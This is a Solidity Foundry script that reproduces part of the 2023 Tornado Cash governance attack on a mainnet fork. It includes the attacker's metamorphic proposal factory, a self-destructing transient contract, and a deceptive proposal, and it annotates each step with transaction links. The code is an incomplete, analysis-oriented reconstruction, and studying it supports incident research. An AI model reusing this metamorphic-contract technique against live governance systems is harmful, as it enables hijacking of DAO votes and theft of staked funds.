// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/Script.sol";

import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {Ownable} from "./AttackerOwnable.sol";
import "./TornadoGovernance.interface.sol";

contract Exploit_TornadoCashGovernanceS is Script, TestHarness, TokenBalanceTracker {
    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);

    address ATTACKER1 = makeAddr("Attacker1");
    address ATTACKER2 = makeAddr("Attacker2");

    ReinitializableContractFactory proposalFactory;
    TransientContract transientContract;
    Proposal_20 proposal_20;

    function setUp() public {
        cheat.createSelectFork("mainnet", 17249477); // The block where the step 0. happens.

        // The attacker used two accounts
        cheat.deal(ATTACKER1, 0.5 ether);
        cheat.deal(ATTACKER2, 0.5 ether);

        //  This contract would play the role of the Attacker Contract
        cheat.deal(address(this), 0.5 ether);

        _labelAccounts();
        _tokenTrackerSetup();
    }

    function run() external {
        setUp();

        console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL ========");
        // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
        // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
        _deployFactoryAndProposal();

        console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
        // 3. Selfdestruct both the proposal and transient contract
        // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0
        vm.prank(ATTACKER2);
        proposalFactory.emergencyStop();
        console2.log("WOLOLO");
        console2.log(address(proposal_20).code.length);
        // cheat.etch(address(proposal_20), new bytes(0));
        // console2.log(address(proposal_20).code.length);
    }

    function _deployFactoryAndProposal() internal {
        vm.startPrank(ATTACKER2);

        // Deploy the factory
        proposalFactory = new ReinitializableContractFactory(type(TransientContract).creationCode);
        console2.log("Proposal Factory deployed at: %s", address(proposalFactory));

        // Deploy the proposal through a transient
        (address proposal, address transient) =
            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), type(Proposal_20).creationCode);

        proposal_20 = Proposal_20(proposal);
        transientContract = TransientContract(transient);

        // Check the transient contract with a read method:
        address preCalcTransientContract = proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));

        assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient contract");
        assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");

        console2.log("Transient deployed at: %s", address(transientContract));
        console2.log("Proposal 20 deployed at: %s", address(proposal_20));
        vm.stopPrank();
    }

    function _labelAccounts() internal {
        cheat.label(address(tornToken), "TORN");

        cheat.label(address(this), "ATTACKER CONTRACT");
    }

    function _tokenTrackerSetup() internal {
        addTokenToTracker(address(tornToken));

        updateBalanceTracker(address(this));
        updateBalanceTracker(ATTACKER1);
        updateBalanceTracker(ATTACKER2);
    }
}

// Factory capable of deploying contracts that selfdestruct changing their implementation
// using a combination of create2 and create with a transient contract
// Deployed at tx: https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a

// Heavily inspired by 0age Metamorphic contracts: https://github.com/0age/metamorphic/
contract ReinitializableContractFactory is Ownable {
    bytes _transientContractInitializationCode;
    bytes32 _transientContractInitializationCodeHash;
    mapping(address => bytes) private _initCodes;

    address public proposal;
    address public transient;

    constructor(bytes memory transientContractInitializationCode) {
        // store the initialization code for the transient contract.
        _transientContractInitializationCode = transientContractInitializationCode;

        // calculate and assign keccak256 hash of transient initialization code.
        _transientContractInitializationCodeHash = keccak256(abi.encodePacked(_transientContractInitializationCode));
    }

    function emergencyStop() external onlyOwner {
        console2.log("Triggering destruction of transient and proposal...");
        TransientContract(transient).emergencyStop();
        console2.log("Successfully destroyed proposal and transient");
    }

    /**
     * @dev impl by 0age
     * @dev Modifier to ensure that the first 20 bytes of a submitted salt match
     * those of the calling account. This provides protection against the salt
     * being stolen by frontrunners or other attackers.
     * @param salt bytes32 The salt value to check against the calling address.
     */
    modifier containsCaller(bytes32 salt) {
        // prevent contract submissions from being stolen from tx.pool by requiring
        // that the first 20 bytes of the submitted salt match msg.sender.
        require(
            address(bytes20(salt)) == msg.sender,
            "Invalid salt - first 20 bytes of the salt must match calling address."
        );
        _;
    }

    // This function implements the logic behind the deployment for a proposal via a transient contract
    // First, the transient contract is deployed with Create2 and then the latter deploys the proposal with Create
    // More details: https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
    // Method called after: 0xce40d339 in the attacker's contract factory
    /// @dev base impl by 0age
    function createProposalWithTransient(bytes32 salt, bytes memory proposalInitializationCode)
        public
        payable
        containsCaller(salt)
        returns (address proposalContractAddress, address deployedTransientContract)
    {
        // move transient contract initialization code from storage to memory.
        bytes memory initCode = _transientContractInitializationCode;

        // determine the address of the transient contract.
        address transientContractAddress = getTransientContractAddress(salt);

        // store the initialization code to be retrieved by the transient contract.
        _initCodes[transientContractAddress] = proposalInitializationCode;

        uint256 value = msg.value;

        // load transient contract data and length of data, then deploy via CREATE2.
        /* solhint-disable no-inline-assembly */
        assembly {
            let encoded_data := add(0x20, initCode) // load initialization code.
            let encoded_size := mload(initCode) // load the init code's length.
            deployedTransientContract :=
                create2( // call CREATE2 with 4 arguments.
                    value, // forward any supplied endowment.
                    encoded_data, // pass in initialization code.
                    encoded_size, // pass in init code's length.
                    salt // pass in the salt value.
                )
        } /* solhint-enable no-inline-assembly */

        // ensure that the contracts were successfully deployed.
        require(
            deployedTransientContract == transientContractAddress,
            "Failed to deploy metamorphic contract using given salt and init code."
        );

        proposalContractAddress = _getProposalAddress(transientContractAddress);
        proposal = proposalContractAddress;
        transient = deployedTransientContract;
    }

    /// @dev impl by 0age
    function _getProposalAddress(address transientContractAddress) internal pure returns (address) {
        // determine the address of the metamorphic contract.
        return address(
            uint160( // downcast to match the address type.
                uint256( // set to uint to truncate upper digits.
                    keccak256( // compute CREATE hash via RLP encoding.
                        abi.encodePacked( // pack all inputs to the hash together.
                            bytes1(0xd6), // first RLP byte.
                            bytes1(0x94), // second RLP byte.
                            transientContractAddress, // called by the transient contract.
                            bytes1(0x01) // nonce begins at 1 for contracts.
                        )
                    )
                )
            )
        );
    }

    /// @dev impl by 0age
    function getInitializationCode() external view returns (bytes memory initializationCode) {
        return _initCodes[msg.sender];
    }

    /// @dev impl by 0age
    function getTransientContractAddress(bytes32 salt) public view returns (address) {
        // determine the address of the transient contract.
        return address(
            uint160( // downcast to match the address type.
                uint256( // convert to uint to truncate upper digits.
                    keccak256( // compute the CREATE2 hash using 4 inputs.
                        abi.encodePacked( // pack all inputs to the hash together.
                            hex"ff", // start with 0xff to distinguish from RLP.
                            address(this), // this contract will be the caller.
                            salt, // pass in the supplied salt value.
                            _transientContractInitializationCodeHash // supply init code hash.
                        )
                    )
                )
            )
        );
    }
}

contract TransientContract is Ownable {
    // The owner of this contract will be the Factory

    address public factory;
    address public proposal;

    constructor() payable {
        factory = msg.sender;

        // Transfer the ownership of this contract to the factory
        _transferOwnership(factory);

        // Deployment of Proposal
        // retrieve the target implementation address from creator of this contract.
        bytes memory initCode = IReinitializableContractFactory(msg.sender).getInitializationCode();

        // set up a memory location for the address of the new Proposal contract.
        address payable proposalContractAddress;

        uint256 value = msg.value;

        // deploy the Proposal contract address using the supplied init code.
        /* solhint-disable no-inline-assembly */
        assembly {
            let encoded_data := add(0x20, initCode) // load initialization code.
            let encoded_size := mload(initCode) // load init code's length.
            proposalContractAddress :=
                create( // call CREATE with 3 arguments.
                    value, // forward any supplied endowment.
                    encoded_data, // pass in initialization code.
                    encoded_size // pass in init code's length.
                )
        } /* solhint-enable no-inline-assembly */

        // ensure that the metamorphic contract was successfully deployed.
        require(proposalContractAddress != address(0));
        proposal = proposalContractAddress;

        // destroy transient contract and forward all value to metamorphic contract.
        // selfdestruct(proposalContractAddress);
    }

    // The attacker named this function after "emergencyStop"
    // More details: https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=1&debugLine=1
    // This call first triggers the destruction of the Proposal and then its own.
    function emergencyStop() external onlyOwner {
        IMaliciousSelfDestruct(proposal).emergencyStop(); // Destroy the proposal
        console2.log("Destroying transient...");
        selfdestruct(payable(owner())); // Destroy this
    }
}

// This was a benign proposal previously executed and the one referenced as the attacker
// The attacker claimed that his proposal had this very same implementation but targeting different relayers
contract Proposal_16 is IProposal {
    function getNullifiedTotal(address[13] memory relayers) public returns (uint256) {
        uint256 nullifiedTotal;

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;

        for (uint8 x = 0; x < relayers.length; x++) {
            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);
        }

        return nullifiedTotal;
    }

    function executeProposal() external {
        address[13] memory VIOLATING_RELAYERS = [
            0x30F96AEF199B399B722F8819c9b0723016CEAe6C, // moon-relayer.eth
            0xEFa22d23de9f293B11e0c4aC865d7b440647587a, // tornado-relayer.eth
            0x996ad81FD83eD7A87FD3D03694115dff19db0B3b, // secure-tornado.eth
            0x7853E027F37830790685622cdd8685fF0c8255A2, // tornado-secure.eth
            0x36DD7b862746fdD3eDd3577c8411f1B76FDC2Af5, // tornado-crypto-bot-exchange.eth
            0x18F516dD6D5F46b2875Fd822B994081274be2a8b, // torn69.eth
            0x853281B7676DFB66B87e2f26c9cB9D10Ce883F37, // available-reliable-relayer.eth
            0xaaaaD0b504B4CD22348C4Db1071736646Aa314C6, // tornrelayers.eth
            0x0000208a6cC0299dA631C08fE8c2EDe435Ea83B8, // 0xtornadocash.eth
            0xf0D9b969925116074eF43e7887Bcf035Ff1e7B19, // lowfee-relayer.eth
            0x12D92FeD171F16B3a05ACB1542B40648E7CEd384, // torn-relayers.eth
            0x87BeDf6AD81A2907633Ab68D02c44f0415bc68C1, // tornrelayer.eth
            0x14812AE927e2BA5aA0c0f3C0eA016b3039574242 // pls-im-poor.eth
        ];

        uint256 NEW_MINIMUM_STAKE_AMOUNT = 2000 ether;
        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;
        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;

        IRelayerRegistry(_registryAddress).setMinStakeAmount(NEW_MINIMUM_STAKE_AMOUNT);

        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[4]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[5]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[6]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[7]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[8]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[9]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[10]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[11]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[12]);

        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);
    }
}

// The initial malicious proposal implementation could be debugged here: https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=3&debugLine=3
contract Proposal_20 is Ownable {
    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
        uint256 nullifiedTotal;

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;

        for (uint8 x = 0; x < relayers.length; x++) {
            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);
        }

        return nullifiedTotal;
    }

    function executeProposal() external {
        address[4] memory VIOLATING_RELAYERS = [
            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth
            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth
            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth
            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth
        ];

        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;
        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;

        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);

        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);
    }

    function emergencyStop() public onlyOwner {
        console2.log("Destroying proposal...");
        selfdestruct(payable(0));
    }
}
